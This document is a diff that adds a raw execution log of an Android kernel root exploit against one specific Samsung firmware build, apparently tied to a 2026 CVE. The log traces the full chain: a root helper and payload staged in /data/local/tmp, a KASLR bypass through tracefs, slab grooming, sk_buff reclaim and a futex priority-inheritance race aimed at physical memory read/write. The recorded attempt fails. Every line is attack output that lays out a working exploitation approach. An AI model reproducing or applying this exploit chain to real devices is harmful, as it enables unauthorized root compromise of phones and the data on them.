@@ -1,0 +1,41 @@
+[app] root helper=/data/local/tmp/cve-2026-43499-root
+[app] loading verified payload=/data/local/tmp/rmg-ktc-v1.3.so
+[+] target guard exact firmware and boot checks passed
+[32m[+] [0mpreload supervisor pid=14737 attempts=1 base_delay=20000 p0_timeout=115 timeout=600
+[32m[+] [0mexploit attempt=1/1 pid=14738 delay=50000 p0_offset=scan
+[32m[+] [0mstartup context pid=14738 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=14738 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=14738 label=e3q-S928NKSU6EZIF-KTC-payload-v1.3-tracefs stack_writer=pselect reclaim=legacy fops=bank pipe=before-fops
+[32m[+] [0mp0 profile pid=14738 phys_offset=00000000816e0000 kernel_phys_load=00000000a8000000 delta=0000000026920000 slide_logger=ffffff8027fda44f bootid_data=ffffff8028cb6a98 init_task=ffffff8028b8f6c0 root_tg=ffffff8028d8dd80 sysctl_bootid=ffffff8028f45768
+[33m[*] [0mslide source mode=p0
+[32m[+] [0mslide tracefs pre-oracle base=ffffffc008110000 slide=00110000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=14738 base=ffffffc008110000 slide=0000000000110000 data_mode=canonical
+[33m[*] [0mfresh physrw pipe page=ffffff80250f0000
+[33m[*] [0mmm leaked=ffffff8939efa800 base=ffffff8939ef8000 object_index=10
+[33m[*] [0mS928 bank bucket=10 lock=0x36a0 task=0x1000 mode=0
+[33m[*] [0mmm target-neighbor slab queued for late drain
+[33m[*] [0mmm late cpu-partial drain triggers=32
+[33m[*] [0msk_buff reclaim sends=4/4 mode=0
+[33m[*] [0mkernel page prepare mode=0 attempt=1/1 elapsed_ms=9006 base=ffffff8939ef8000
+[33m[*] [0mdurable log checkpoint stage=fops-page-held
+[33m[*] [0mp0 reference keeper pid=23948 pipe=0
+[33m[*] [0mapp fops slide route parent=ffffff8939ef9180 target=ffffffc00a4ec200 lock=ffffff8939efa820 configured_delay=50000 consume_delay=50000 fine_ticks=0
+[32m[+] [0mslide child context stack_writer=pselect pid=23949 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=23951
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=23951
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=23950
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=23950
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=23950
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=23950
+[33m[*] [0mslide pi stage=writer-enter tid=23950
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=23951
+[33m[*] [0mslide pi stage=writer-return tid=23950 sched_ok=1 window=1
+[33m[*] [0mS928 route result=0 waiter_ok=1 write_window=0 route_done=1 consumer_seen=1 entered=1 sched_ok=1 calls=1 pselect_ret=7 pselect_errno=0 pselect_elapsed_usec=100252
+[33m[*] [0mapp fops slide attempt=1/1 triggered=0 verified=0 step=0 errno=0
+[32m[+] [0mpipe-physrw-summary pid=14738 done=0 root=0 kaslr=1 base=ffffffc008110000 slide=0000000000110000
+[32m[+] [0mpipe physrw pid=14738 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295
+[31m[-] [0mstack writer ran; target permits another independent attempt
+[31m[-] [0mexploit attempt=1/1 failed status=1
+[31m[!] [0mexploit failed after 1 independent attempts
